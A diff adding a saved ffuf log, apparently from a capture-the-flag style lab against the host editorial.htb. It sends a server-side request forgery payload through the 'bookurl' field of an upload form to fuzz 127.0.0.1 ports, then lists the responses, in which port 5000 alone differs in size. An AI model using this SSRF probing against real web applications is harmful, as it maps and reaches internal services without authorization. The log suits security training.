@@ -1,0 +1,78 @@
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://editorial.htb/upload-cover
+ :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/Infrastructure/common-http-ports.txt
+ :: Header           : Origin: http://editorial.htb
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Accept-Language: en-US,en;q=0.9
+ :: Header           : Connection: keep-alive
+ :: Header           : User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+ :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVlbSDjsIzoPS7xNi
+ :: Header           : Accept: */*
+ :: Header           : Referer: http://editorial.htb/upload
+ :: Header           : Host: editorial.htb
+ :: Data             : ------WebKitFormBoundaryVlbSDjsIzoPS7xNi
+Content-Disposition: form-data; name="bookurl"
+
+http://127.0.0.1:FUZZ
+------WebKitFormBoundaryVlbSDjsIzoPS7xNi
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+------WebKitFormBoundaryVlbSDjsIzoPS7xNi--
+
+
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 120
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+________________________________________________
+
+[2K66                      [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K30821                   [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K445                     [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K6346                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K5802                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K6347                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K8080                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K7002                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K5801                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K8443                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K4001                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K8000                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K7001                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K8888                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K4002                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K5800                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K4000                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K81                      [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K4100                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K3306                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K5432                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1352                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K3128                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K5000                    [Status: 200, Size: 71, Words: 1, Lines: 1]
+[2K443                     [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1433                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1944                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1100                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1434                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K3000                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K2301                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K457                     [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1521                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1080                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K1241                    [Status: 200, Size: 76, Words: 2, Lines: 1]
+[2K80                      [Status: 200, Size: 76, Words: 2, Lines: 1]
